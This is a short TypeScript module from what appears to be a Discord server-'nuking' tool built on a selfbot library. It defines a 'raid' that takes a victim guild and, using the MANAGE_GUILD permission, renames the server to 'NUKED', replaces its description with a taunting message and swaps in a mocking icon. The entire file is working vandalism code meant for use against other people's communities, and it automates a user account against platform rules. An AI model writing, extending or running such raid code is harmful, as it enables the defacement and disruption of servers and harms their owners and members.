import { Guild } from 'discord.js-selfbot-v13'
import { Raid } from './../typings/index.js'
import { Log, spinner } from './../utils/index.js'

const guildInfoRaid: Raid = {
	name: 'GUILD_INFO_RAID',
	id: 3,
	permission: 'MANAGE_GUILD',
	async execute(victimGuild: Guild) {
		const _spinner = spinner('Nuking server info...')

		await victimGuild.edit({
			name: 'NUKED',
			description:
				'THIS SERVER WAS NUKED HAHA. GET REKT!!! THE MADLAD USED NUKECORD SCRIPT!!!',
			icon: `https://raw.githubusercontent.com/DarkGuy10/Nukecord/master/assets/CryingMan.png`,
		})

		_spinner.stop()
		Log.success(`Updated guild info`)
	},
}

export default guildInfoRaid
